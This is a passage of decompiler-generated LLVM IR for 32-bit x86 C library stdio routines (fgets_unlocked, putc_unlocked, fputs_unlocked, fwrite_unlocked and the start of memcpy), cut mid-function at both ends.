  br i1 %v1_80518ed, label %dec_label_pc_80518fb, label %dec_label_pc_80518ef

dec_label_pc_80518ef:                             ; preds = %dec_label_pc_80518dc
  %v3_80518ef = load i16, i16* %arg1, align 2
  %v4_80518ef = and i16 %v3_80518ef, -65
  store i16 %v4_80518ef, i16* %arg1, align 2
  %v2_80518f3 = add i32 %v4_80517cd, 8
  %v3_80518f3 = inttoptr i32 %v2_80518f3 to i32*
  %v4_80518f3 = load i32, i32* %v3_80518f3, align 4
  %v3_80518f6 = add i32 %v4_80517cd, 28
  %v4_80518f6 = inttoptr i32 %v3_80518f6 to i32*
  store i32 %v4_80518f3, i32* %v4_80518f6, align 4
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_80518fb

dec_label_pc_80518fb:                             ; preds = %dec_label_pc_80518dc, %dec_label_pc_80518d5, %dec_label_pc_80518ce, %dec_label_pc_80518ef
  %v0_80518fe = load i32, i32* @edi, align 4
  store i32 %v0_80517c7, i32* @ebx, align 4
  store i32 %v0_80517c6, i32* @esi, align 4
  store i32 %v0_80517c5, i32* @edi, align 4
  store i32 %v0_80517c4, i32* @ebp, align 4
  ret i32 %v0_80518fe

; uselistorder directives
  uselistorder i32 %v3_80518c7, { 1, 2, 0 }
  uselistorder i32 %v4_80517cd, { 1, 2, 0, 3 }
  uselistorder i32 ()* @_stdio_openlist_dec_use, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_80627e0.213 to i32), { 3, 2, 4, 0, 5, 6, 7, 1 }
  uselistorder i32* @global_var_806507c.206, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_80627f8.205 to i32), { 0, 6, 1, 7, 2, 8, 9, 12, 3, 10, 5, 11, 4 }
  uselistorder i16* %arg1, { 1, 2, 3, 4, 0, 5 }
  uselistorder label %dec_label_pc_80518fb, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80518c7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80518ad, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805187f, { 1, 0 }
  uselistorder label %dec_label_pc_8051852, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_8051908 = load i32, i32* @ebp, align 4
  %v0_8051909 = load i32, i32* @edi, align 4
  %v4_805190f = ptrtoint i8* %arg1 to i32
  store i32 %v4_805190f, i32* @edi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %v4_805190f, i32* @ebx, align 4
  %tmp17 = icmp slt i32 %arg2, 1
  %tmp18 = icmp eq i1 %tmp17, false
  br i1 %tmp18, label %dec_label_pc_8051959.preheader, label %dec_label_pc_8051965

dec_label_pc_8051959.preheader:                   ; preds = %entry
  %v1_805195919 = add i32 %arg2, -1
  %v8_805195923 = icmp eq i32 %v1_805195919, 0
  store i32 %v1_805195919, i32* @esi, align 4
  %v1_805195a24 = icmp eq i1 %v8_805195923, false
  br i1 %v1_805195a24, label %dec_label_pc_8051923, label %dec_label_pc_805195c

dec_label_pc_8051923:                             ; preds = %dec_label_pc_8051959.preheader, %dec_label_pc_8051957.dec_label_pc_8051959_crit_edge.dec_label_pc_8051923_crit_edge
  %v0_8051923 = phi i32 [ %v0_8051923.pre, %dec_label_pc_8051957.dec_label_pc_8051959_crit_edge.dec_label_pc_8051923_crit_edge ], [ %arg3, %dec_label_pc_8051959.preheader ]
  %v1_8051923 = add i32 %v0_8051923, 16
  %v2_8051923 = inttoptr i32 %v1_8051923 to i32*
  %v3_8051923 = load i32, i32* %v2_8051923, align 4
  store i32 %v3_8051923, i32* %eax.global-to-local, align 4
  %v2_8051926 = add i32 %v0_8051923, 24
  %v3_8051926 = inttoptr i32 %v2_8051926 to i32*
  %v4_8051926 = load i32, i32* %v3_8051926, align 4
  %v10_8051926 = icmp ult i32 %v3_8051923, %v4_8051926
  %v1_8051929 = icmp eq i1 %v10_8051926, false
  br i1 %v1_8051929, label %dec_label_pc_8051939, label %dec_label_pc_805192b

dec_label_pc_805192b:                             ; preds = %dec_label_pc_8051923
  %v1_805192b = inttoptr i32 %v3_8051923 to i8*
  %v2_805192b = load i8, i8* %v1_805192b, align 1
  %v3_805192b = zext i8 %v2_805192b to i32
  %v4_805192b = load i32, i32* @edx, align 4
  %v5_805192b = and i32 %v4_805192b, -256
  %v6_805192b = or i32 %v5_805192b, %v3_805192b
  store i32 %v6_805192b, i32* @edx, align 4
  %v1_805192d = add i32 %v3_8051923, 1
  store i32 %v1_805192d, i32* %eax.global-to-local, align 4
  %v2_805192e = load i32, i32* @ebx, align 4
  %v3_805192e = inttoptr i32 %v2_805192e to i8*
  store i8 %v2_805192b, i8* %v3_805192e, align 1
  %v0_8051930 = load i32, i32* @ebx, align 4
  %v1_8051930 = add i32 %v0_8051930, 1
  store i32 %v1_8051930, i32* @ebx, align 4
  %v0_8051931 = load i32, i32* @edx, align 4
  %v1_8051931 = trunc i32 %v0_8051931 to i8
  %v10_8051931 = icmp eq i8 %v1_8051931, 10
  %v0_8051934 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051934 = load i32, i32* @ebp, align 4
  %v2_8051934 = add i32 %v1_8051934, 16
  %v3_8051934 = inttoptr i32 %v2_8051934 to i32*
  store i32 %v0_8051934, i32* %v3_8051934, align 4
  br i1 %v10_8051931, label %dec_label_pc_805195c, label %dec_label_pc_8051957.dec_label_pc_8051959_crit_edge

dec_label_pc_8051939:                             ; preds = %dec_label_pc_8051923
  %v0_805193d = call i32 @getc_unlocked()
  %v1_805193d = trunc i32 %v0_805193d to i8
  store i32 %v0_805193d, i32* %eax.global-to-local, align 4
  %sext = mul i32 %v0_805193d, 16777216
  %tmp = icmp eq i32 %sext, -16777216
  %v1_8051948 = icmp eq i1 %tmp, false
  br i1 %v1_8051948, label %dec_label_pc_8051957, label %dec_label_pc_805194a

dec_label_pc_805194a:                             ; preds = %dec_label_pc_8051939
  %v0_805194a = load i32, i32* @ebp, align 4
  %v1_805194a = inttoptr i32 %v0_805194a to i8*
  %v2_805194a = load i8, i8* %v1_805194a, align 1
  %v3_805194a = and i8 %v2_805194a, 8
  %v4_805194a = icmp eq i8 %v3_805194a, 0
  br i1 %v4_805194a, label %dec_label_pc_805195c, label %dec_label_pc_8051965

dec_label_pc_8051957:                             ; preds = %dec_label_pc_8051939
  %v3_8051952 = load i32, i32* @ebx, align 4
  %v4_8051952 = inttoptr i32 %v3_8051952 to i8*
  store i8 %v1_805193d, i8* %v4_8051952, align 1
  %v0_8051954 = load i32, i32* @ebx, align 4
  %v1_8051954 = add i32 %v0_8051954, 1
  store i32 %v1_8051954, i32* @ebx, align 4
  %v11_8051955 = icmp eq i8 %v1_805193d, 10
  br i1 %v11_8051955, label %dec_label_pc_805195c, label %dec_label_pc_8051957.dec_label_pc_8051959_crit_edge

dec_label_pc_8051957.dec_label_pc_8051959_crit_edge: ; preds = %dec_label_pc_805192b, %dec_label_pc_8051957
  %v0_8051959.pre = load i32, i32* @esi, align 4
  %v1_8051959 = add i32 %v0_8051959.pre, -1
  %v8_8051959 = icmp eq i32 %v1_8051959, 0
  store i32 %v1_8051959, i32* @esi, align 4
  %v1_805195a = icmp eq i1 %v8_8051959, false
  br i1 %v1_805195a, label %dec_label_pc_8051957.dec_label_pc_8051959_crit_edge.dec_label_pc_8051923_crit_edge, label %dec_label_pc_805195c

dec_label_pc_8051957.dec_label_pc_8051959_crit_edge.dec_label_pc_8051923_crit_edge: ; preds = %dec_label_pc_8051957.dec_label_pc_8051959_crit_edge
  %v0_8051923.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8051923

dec_label_pc_805195c:                             ; preds = %dec_label_pc_8051959.preheader, %dec_label_pc_805192b, %dec_label_pc_8051957.dec_label_pc_8051959_crit_edge, %dec_label_pc_8051957, %dec_label_pc_805194a
  %v0_805195c = load i32, i32* @ebx, align 4
  %v1_805195c = load i32, i32* @edi, align 4
  %tmp26 = icmp ugt i32 %v0_805195c, %v1_805195c
  br i1 %tmp26, label %dec_label_pc_8051960, label %dec_label_pc_8051965

dec_label_pc_8051960:                             ; preds = %dec_label_pc_805195c
  %v1_8051960 = inttoptr i32 %v0_805195c to i8*
  store i8 0, i8* %v1_8051960, align 1
  %v0_805196a.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051967

dec_label_pc_8051965:                             ; preds = %dec_label_pc_805195c, %dec_label_pc_805194a, %entry
  br label %dec_label_pc_8051967

dec_label_pc_8051967:                             ; preds = %dec_label_pc_8051960, %dec_label_pc_8051965
  %v0_805196a = phi i32 [ %v0_805196a.pre, %dec_label_pc_8051960 ], [ 0, %dec_label_pc_8051965 ]
  store i32 %v0_805196a, i32* %eax.global-to-local, align 4
  store i32 %v0_8051909, i32* @edi, align 4
  store i32 %v0_8051908, i32* @ebp, align 4
  ret i32 %v0_805196a

; uselistorder directives
  uselistorder i32 %v0_805196a, { 1, 0 }
  uselistorder i32 %v0_805195c, { 1, 0 }
  uselistorder i32 %v1_8051959, { 1, 0 }
  uselistorder i32 %v0_805193d, { 0, 2, 1 }
  uselistorder i32 %v0_8051923, { 1, 0 }
  uselistorder label %dec_label_pc_8051967, { 1, 0 }
  uselistorder label %dec_label_pc_805195c, { 2, 3, 4, 1, 0 }
  uselistorder label %dec_label_pc_8051957.dec_label_pc_8051959_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8051923, { 1, 0 }
}

define i32 @putc_unlocked(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-9 = alloca i8, align 1
  %v0_8051974 = load i32, i32* @esi, align 4
  %v0_8051975 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v4_805197d = sext i8 %arg1 to i32
  store i32 %v4_805197d, i32* @esi, align 4
  %v1_8051981 = add i32 %arg2, 16
  %v2_8051981 = inttoptr i32 %v1_8051981 to i32*
  %v3_8051981 = load i32, i32* %v2_8051981, align 4
  store i32 %v3_8051981, i32* %eax.global-to-local, align 4
  %v2_8051984 = add i32 %arg2, 28
  %v3_8051984 = inttoptr i32 %v2_8051984 to i32*
  %v4_8051984 = load i32, i32* %v3_8051984, align 4
  %v10_8051984 = icmp ult i32 %v3_8051981, %v4_8051984
  %v1_8051987 = icmp eq i1 %v10_8051984, false
  br i1 %v1_8051987, label %dec_label_pc_8051996, label %dec_label_pc_8051989

dec_label_pc_8051989:                             ; preds = %entry
  store i32 %v4_805197d, i32* @edx, align 4
  %v3_805198b = inttoptr i32 %v3_8051981 to i8*
  store i8 %arg1, i8* %v3_805198b, align 1
  %v0_805198d = load i32, i32* %eax.global-to-local, align 4
  %v1_805198d = add i32 %v0_805198d, 1
  store i32 %v1_805198d, i32* %eax.global-to-local, align 4
  %v1_805198e = load i32, i32* @ebx, align 4
  %v2_805198e = add i32 %v1_805198e, 16
  %v3_805198e = inttoptr i32 %v2_805198e to i32*
  store i32 %v1_805198d, i32* %v3_805198e, align 4
  %v0_8051a2b.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8051a2b

dec_label_pc_8051996:                             ; preds = %entry
  %v1_8051996 = inttoptr i32 %arg2 to i16*
  %v2_8051996 = load i16, i16* %v1_8051996, align 2
  %v3_8051996 = zext i16 %v2_8051996 to i32
  %v1_8051999 = and i32 %v3_8051996, 192
  store i32 %v1_8051999, i32* %eax.global-to-local, align 4
  %v6_805199e = icmp eq i32 %v1_8051999, 192
  br i1 %v6_805199e, label %dec_label_pc_80519b9, label %dec_label_pc_80519a5

dec_label_pc_80519a5:                             ; preds = %dec_label_pc_8051996
  %v0_80519a5 = load i32, i32* @edx, align 4
  %sext = mul i32 %v0_80519a5, 16777216
  %v5_80519ad = sdiv i32 %sext, 16777216
  %v7_80519ad = call i32 @__stdio_trans2w_o(i16* %v1_8051996, i32 128, i32 %v0_80519a5, i32 %v5_80519ad)
  store i32 %v7_80519ad, i32* %eax.global-to-local, align 4
  %v1_80519b5 = icmp eq i32 %v7_80519ad, 0
  %v1_80519b7 = icmp eq i1 %v1_80519b5, false
  br i1 %v1_80519b7, label %dec_label_pc_8051a30, label %dec_label_pc_80519a5.dec_label_pc_80519b9_crit_edge

dec_label_pc_80519a5.dec_label_pc_80519b9_crit_edge: ; preds = %dec_label_pc_80519a5
  %v0_80519b9.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80519b9

dec_label_pc_80519b9:                             ; preds = %dec_label_pc_80519a5.dec_label_pc_80519b9_crit_edge, %dec_label_pc_8051996
  %v0_8051a1c = phi i32 [ %v0_80519b9.pre, %dec_label_pc_80519a5.dec_label_pc_80519b9_crit_edge ], [ %arg2, %dec_label_pc_8051996 ]
  %v1_80519b9 = add i32 %v0_8051a1c, 4
  %v2_80519b9 = inttoptr i32 %v1_80519b9 to i32*
  %v3_80519b9 = load i32, i32* %v2_80519b9, align 4
  %v13_80519b9 = icmp eq i32 %v3_80519b9, -2
  %v1_80519bd = icmp eq i1 %v13_80519b9, false
  br i1 %v1_80519bd, label %dec_label_pc_80519c6, label %dec_label_pc_80519bf

dec_label_pc_80519bf:                             ; preds = %dec_label_pc_80519b9
  %v0_80519bf = load i32, i32* @esi, align 4
  store i32 %v0_80519bf, i32* @ecx, align 4
  %v1_80519c1 = urem i32 %v0_80519bf, 256
  store i32 %v1_80519c1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051a33

dec_label_pc_80519c6:                             ; preds = %dec_label_pc_80519b9
  %v1_80519c6 = add i32 %v0_8051a1c, 12
  %v2_80519c6 = inttoptr i32 %v1_80519c6 to i32*
  %v3_80519c6 = load i32, i32* %v2_80519c6, align 4
  store i32 %v3_80519c6, i32* %eax.global-to-local, align 4
  %v2_80519c9 = add i32 %v0_8051a1c, 8
  %v3_80519c9 = inttoptr i32 %v2_80519c9 to i32*
  %v4_80519c9 = load i32, i32* %v3_80519c9, align 4
  %v15_80519c9 = icmp eq i32 %v3_80519c6, %v4_80519c9
  br i1 %v15_80519c9, label %dec_label_pc_8051a0e, label %dec_label_pc_80519ce

dec_label_pc_80519ce:                             ; preds = %dec_label_pc_80519c6
  %v2_80519ce = add i32 %v0_8051a1c, 16
  %v3_80519ce = inttoptr i32 %v2_80519ce to i32*
  %v4_80519ce = load i32, i32* %v3_80519ce, align 4
  %v15_80519ce = icmp eq i32 %v3_80519c6, %v4_80519ce
  %v1_80519d1 = icmp eq i1 %v15_80519ce, false
  br i1 %v1_80519d1, label %dec_label_pc_80519e3, label %dec_label_pc_80519d3

dec_label_pc_80519d3:                             ; preds = %dec_label_pc_80519ce
  %v2_80519d7 = call i32 @__stdio_wcommit(i32 %v0_8051a1c)
  store i32 %v2_80519d7, i32* %eax.global-to-local, align 4
  %v1_80519df = icmp eq i32 %v2_80519d7, 0
  %v1_80519e1 = icmp eq i1 %v1_80519df, false
  br i1 %v1_80519e1, label %dec_label_pc_8051a30, label %dec_label_pc_80519d3.dec_label_pc_80519e3_crit_edge

dec_label_pc_80519d3.dec_label_pc_80519e3_crit_edge: ; preds = %dec_label_pc_80519d3
  %v0_80519e3.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80519e3

dec_label_pc_80519e3:                             ; preds = %dec_label_pc_80519d3.dec_label_pc_80519e3_crit_edge, %dec_label_pc_80519ce
  %v0_80519e3 = phi i32 [ %v0_80519e3.pre, %dec_label_pc_80519d3.dec_label_pc_80519e3_crit_edge ], [ %v0_8051a1c, %dec_label_pc_80519ce ]
  %v1_80519e3 = add i32 %v0_80519e3, 16
  %v2_80519e3 = inttoptr i32 %v1_80519e3 to i32*
  %v3_80519e3 = load i32, i32* %v2_80519e3, align 4
  store i32 %v3_80519e3, i32* %eax.global-to-local, align 4
  %v0_80519e6 = load i32, i32* @esi, align 4
  store i32 %v0_80519e6, i32* %edx.global-to-local, align 4
  %v1_80519e8 = trunc i32 %v0_80519e6 to i8
  %v3_80519e8 = inttoptr i32 %v3_80519e3 to i8*
  store i8 %v1_80519e8, i8* %v3_80519e8, align 1
  %v0_80519ea = load i32, i32* %eax.global-to-local, align 4
  %v1_80519ea = add i32 %v0_80519ea, 1
  store i32 %v1_80519ea, i32* %eax.global-to-local, align 4
  %v1_80519eb = load i32, i32* @ebx, align 4
  %v2_80519eb = add i32 %v1_80519eb, 16
  %v3_80519eb = inttoptr i32 %v2_80519eb to i32*
  store i32 %v1_80519ea, i32* %v3_80519eb, align 4
  %v0_80519ee = load i32, i32* @ebx, align 4
  %v1_80519ee = add i32 %v0_80519ee, 1
  %v2_80519ee = inttoptr i32 %v1_80519ee to i8*
  %v3_80519ee = load i8, i8* %v2_80519ee, align 1
  %v4_80519ee = urem i8 %v3_80519ee, 2
  %v5_80519ee = icmp eq i8 %v4_80519ee, 0
  br i1 %v5_80519ee, label %dec_label_pc_8051a29, label %dec_label_pc_80519f4

dec_label_pc_80519f4:                             ; preds = %dec_label_pc_80519e3
  %v0_80519f4 = load i32, i32* %edx.global-to-local, align 4
  %v1_80519f4 = trunc i32 %v0_80519f4 to i8
  %v10_80519f4 = icmp eq i8 %v1_80519f4, 10
  %v1_80519f7 = icmp eq i1 %v10_80519f4, false
  br i1 %v1_80519f7, label %dec_label_pc_8051a29, label %dec_label_pc_80519f9

dec_label_pc_80519f9:                             ; preds = %dec_label_pc_80519f4
  %v2_80519fd = call i32 @__stdio_wcommit(i32 %v0_80519ee)
  store i32 %v2_80519fd, i32* %eax.global-to-local, align 4
  %v1_8051a05 = icmp eq i32 %v2_80519fd, 0
  br i1 %v1_8051a05, label %dec_label_pc_8051a29, label %dec_label_pc_8051a09

dec_label_pc_8051a09:                             ; preds = %dec_label_pc_80519f9
  %v0_8051a09 = load i32, i32* @ebx, align 4
  %v1_8051a09 = add i32 %v0_8051a09, 16
  %v2_8051a09 = inttoptr i32 %v1_8051a09 to i32*
  %v3_8051a09 = load i32, i32* %v2_8051a09, align 4
  %v4_8051a09 = add i32 %v3_8051a09, -1
  store i32 %v4_8051a09, i32* %v2_8051a09, align 4
  br label %dec_label_pc_8051a30

dec_label_pc_8051a0e:                             ; preds = %dec_label_pc_80519c6
  %v0_8051a0e = load i32, i32* @esi, align 4
  %v6_8051a10 = trunc i32 %v0_8051a0e to i8
  store i8 %v6_8051a10, i8* %stack_var_-9, align 1
  %v2_8051a17 = ptrtoint i8* %stack_var_-9 to i32
  store i32 %v2_8051a17, i32* %eax.global-to-local, align 4
  %v5_8051a1c = inttoptr i32 %v0_8051a1c to i16*
  %sext10 = mul i32 %v0_8051a0e, 16777216
  %v5_8051a1d = sdiv i32 %sext10, 16777216
  %v7_8051a1d = call i32 @__stdio_WRITE(i16* %v5_8051a1c, i32 %v2_8051a17, i32 1, i32 %v5_8051a1d)
  store i32 %v7_8051a1d, i32* %eax.global-to-local, align 4
  %v1_8051a25 = icmp eq i32 %v7_8051a1d, 0
  br i1 %v1_8051a25, label %dec_label_pc_8051a30, label %dec_label_pc_8051a29

dec_label_pc_8051a29:                             ; preds = %dec_label_pc_8051a0e, %dec_label_pc_80519f9, %dec_label_pc_80519f4, %dec_label_pc_80519e3
  %v0_8051a29 = load i32, i32* @esi, align 4
  store i32 %v0_8051a29, i32* @edx, align 4
  br label %dec_label_pc_8051a2b

dec_label_pc_8051a2b:                             ; preds = %dec_label_pc_8051989, %dec_label_pc_8051a29
  %v0_8051a2b = phi i32 [ %v0_8051a2b.pre, %dec_label_pc_8051989 ], [ %v0_8051a29, %dec_label_pc_8051a29 ]
  %v1_8051a2b = urem i32 %v0_8051a2b, 256
  store i32 %v1_8051a2b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051a33

dec_label_pc_8051a30:                             ; preds = %dec_label_pc_8051a0e, %dec_label_pc_80519d3, %dec_label_pc_80519a5, %dec_label_pc_8051a09
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051a33

dec_label_pc_8051a33:                             ; preds = %dec_label_pc_8051a2b, %dec_label_pc_80519bf, %dec_label_pc_8051a30
  %v0_8051a38 = phi i32 [ %v1_8051a2b, %dec_label_pc_8051a2b ], [ %v1_80519c1, %dec_label_pc_80519bf ], [ -1, %dec_label_pc_8051a30 ]
  store i32 %v0_8051975, i32* @ebx, align 4
  store i32 %v0_8051974, i32* @esi, align 4
  ret i32 %v0_8051a38

; uselistorder directives
  uselistorder i32 %v1_8051a2b, { 1, 0 }
  uselistorder i32 %v1_80519c1, { 1, 0 }
  uselistorder i32 %v0_8051a1c, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v0_80519a5, { 1, 0 }
  uselistorder label %dec_label_pc_8051a33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051a30, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_8051a2b, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8051a3c = load i32, i32* @esi, align 4
  %v0_8051a3d = load i32, i32* @ebx, align 4
  store i32 %v0_8051a3d, i32* %stack_var_-8, align 4
  %v4_8051a41 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051a41, i32* @ebx, align 4
  %v3_8051a46 = call i32 @strlen(i8* %arg1)
  store i32 %v3_8051a46, i32* @esi, align 4
  %v0_8051a57 = load i32, i32* @ebx, align 4
  %v6_8051a58 = call i32 @__GI_fwrite_unlocked(i32 %v0_8051a57, i64 1, i32 %v3_8051a46, i32 %arg2)
  %v1_8051a63 = load i32, i32* @esi, align 4
  %v12_8051a63 = icmp eq i32 %v6_8051a58, %v1_8051a63
  %v1_8051a65 = icmp eq i1 %v12_8051a63, false
  br i1 %v1_8051a65, label %dec_label_pc_8051a69, label %dec_label_pc_8051a67

dec_label_pc_8051a67:                             ; preds = %entry
  br label %dec_label_pc_8051a69

dec_label_pc_8051a69:                             ; preds = %entry, %dec_label_pc_8051a67
  %v0_8051a69 = phi i32 [ -1, %entry ], [ %v6_8051a58, %dec_label_pc_8051a67 ]
  %v2_8051a6c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051a6c, i32* @ebx, align 4
  store i32 %v0_8051a3c, i32* @esi, align 4
  ret i32 %v0_8051a69

; uselistorder directives
  uselistorder i32 %v6_8051a58, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051a69, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_8051a70 = load i32, i32* @edi, align 4
  %v0_8051a71 = load i32, i32* @esi, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v4_8051a77 = trunc i64 %arg2 to i32
  store i32 %v4_8051a77, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_8051a7f = inttoptr i32 %arg4 to i16*
  %v2_8051a7f = load i16, i16* %v1_8051a7f, align 2
  %v1_8051a82 = and i16 %v2_8051a7f, 192
  %v6_8051a87 = icmp eq i16 %v1_8051a82, 192
  br i1 %v6_8051a87, label %dec_label_pc_8051aa2, label %dec_label_pc_8051a8e

dec_label_pc_8051a8e:                             ; preds = %entry
  %v0_8051a8e = load i32, i32* @edx, align 4
  store i32 %arg4, i32* %stack_var_-28, align 4
  %v6_8051a96 = call i32 @__stdio_trans2w_o(i16* %v1_8051a7f, i32 128, i32 %v0_8051a8e, i32 %v0_8051a8e)
  %v1_8051a9e = icmp eq i32 %v6_8051a96, 0
  %v1_8051aa0 = icmp eq i1 %v1_8051a9e, false
  br i1 %v1_8051aa0, label %dec_label_pc_8051ade, label %dec_label_pc_8051aa2

dec_label_pc_8051aa2:                             ; preds = %dec_label_pc_8051a8e, %entry
  %v2_8051aa2 = icmp eq i32 %v4_8051a77, 0
  br i1 %v2_8051aa2, label %dec_label_pc_8051ade, label %dec_label_pc_8051aa6

dec_label_pc_8051aa6:                             ; preds = %dec_label_pc_8051aa2
  %v1_8051aa6 = icmp eq i32 %arg3, 0
  br i1 %v1_8051aa6, label %dec_label_pc_8051ade, label %dec_label_pc_8051aaa

dec_label_pc_8051aaa:                             ; preds = %dec_label_pc_8051aa6
  %v9_8051aaf = udiv i64 4294967295, %arg2
  %v10_8051aaf = trunc i64 %v9_8051aaf to i32
  %v6_8051ab3 = icmp ult i32 %v10_8051aaf, %arg3
  br i1 %v6_8051ab3, label %dec_label_pc_8051acf, label %dec_label_pc_8051ab5

dec_label_pc_8051ab5:                             ; preds = %dec_label_pc_8051aaa
  %sext = mul i64 %arg2, 4294967296
  %v2_8051ab8 = sdiv i64 %sext, 4294967296
  %v3_8051ab8 = sext i32 %arg3 to i64
  %v4_8051ab8 = mul nsw i64 %v3_8051ab8, %v2_8051ab8
  %v5_8051ab8 = trunc i64 %v4_8051ab8 to i32
  %v0_8051abb = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v5_8051ac1 = call i32 @__stdio_fwrite(i32 %arg1, i32 %v5_8051ab8, i32 %v0_8051abb, i32 %v10_8051aaf)
  %v6_8051ac1 = sext i32 %v5_8051ac1 to i64
  %v10_8051ac8 = udiv i64 %v6_8051ac1, %arg2
  %v11_8051ac8 = trunc i64 %v10_8051ac8 to i32
  br label %dec_label_pc_8051ae0

dec_label_pc_8051acf:                             ; preds = %dec_label_pc_8051aaa
  %v0_8051acf = load i32, i32* @ebx, align 4
  %v1_8051acf = inttoptr i32 %v0_8051acf to i16*
  %v2_8051acf = load i16, i16* %v1_8051acf, align 2
  %v3_8051acf = or i16 %v2_8051acf, 8
  store i16 %v3_8051acf, i16* %v1_8051acf, align 2
  %v0_8051ad3 = load i32, i32* %stack_var_-28, align 4
  %v1_8051ad3 = call i32 @__errno_location(i32 %v0_8051ad3)
  %v1_8051ad8 = inttoptr i32 %v1_8051ad3 to i32*
  store i32 22, i32* %v1_8051ad8, align 4
  br label %dec_label_pc_8051ade

dec_label_pc_8051ade:                             ; preds = %dec_label_pc_8051aa6, %dec_label_pc_8051aa2, %dec_label_pc_8051a8e, %dec_label_pc_8051acf
  br label %dec_label_pc_8051ae0

dec_label_pc_8051ae0:                             ; preds = %dec_label_pc_8051ab5, %dec_label_pc_8051ade
  %v0_8051ae3 = phi i32 [ %v11_8051ac8, %dec_label_pc_8051ab5 ], [ 0, %dec_label_pc_8051ade ]
  store i32 %v0_8051a71, i32* @esi, align 4
  store i32 %v0_8051a70, i32* @edi, align 4
  ret i32 %v0_8051ae3

; uselistorder directives
  uselistorder i32 %v0_8051a8e, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__stdio_fwrite, { 0, 5, 4, 2, 1, 6, 3 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i64 %arg2, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051ae0, { 1, 0 }
  uselistorder label %dec_label_pc_8051ade, { 3, 0, 1, 2 }
}

define i32 @memcpy(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051ae5 = load i32, i32* @esi, align 4
  store i32 %v0_8051ae5, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_8051ae6 = sdiv i32 %sext, 16777216
  store i32 %v4_8051ae6, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8051af0 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8051af0, i32* %edi.global-to-local, align 4
  %v2_8051af4 = udiv i32 %v4_8051ae6, 4
  %v3_8051af7 = inttoptr i32 %arg2 to i8*
  %v4_8051af7 = bitcast i16* %arg1 to i8*
  %v5_8051af7 = call i8* @_memcpy(i8* %v4_8051af7, i8* %v3_8051af7, i32 %v2_8051af4)
  %v6_8051af7 = ptrtoint i8* %v5_8051af7 to i32
  store i32 %v6_8051af7, i32* @ecx, align 4
  %v0_8051af9 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051af9 = and i32 %v0_8051af9, 2
  %v3_8051af9 = icmp eq i32 %v2_8051af9, 0
  br i1 %v3_8051af9, label %dec_label_pc_8051aff, label %dec_label_pc_8051afd

dec_label_pc_8051afd:                             ; preds = %entry
  %v0_8051afd = load i32, i32* %esi.global-to-local, align 4
  %v1_8051afd = inttoptr i32 %v0_8051afd to i16*
  %v2_8051afd = load i16, i16* %v1_8051afd, align 2
  %v3_8051afd = load i32, i32* %edi.global-to-local, align 4
  %v4_8051afd = inttoptr i32 %v3_8051afd to i16*
  store i16 %v2_8051afd, i16* %v4_8051afd, align 2
  %v5_8051afd = load i32, i32* %edi.global-to-local, align 4
  %v6_8051afd = load i32, i32* %esi.global-to-local, align 4
  %v7_8051afd = load i1, i1* @df, align 1
  %v8_8051afd = select i1 %v7_8051afd, i32 -2, i32 2
  %v9_8051afd = add i32 %v8_8051afd, %v5_8051afd
  %v10_8051afd = add i32 %v8_8051afd, %v6_8051afd
  store i32 %v9_8051afd, i32* %edi.global-to-local, align 4
  store i32 %v10_8051afd, i32* %esi.global-to-local, align 4
  %v0_8051aff.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051aff

dec_label_pc_8051aff:                             ; preds = %entry, %dec_label_pc_8051afd
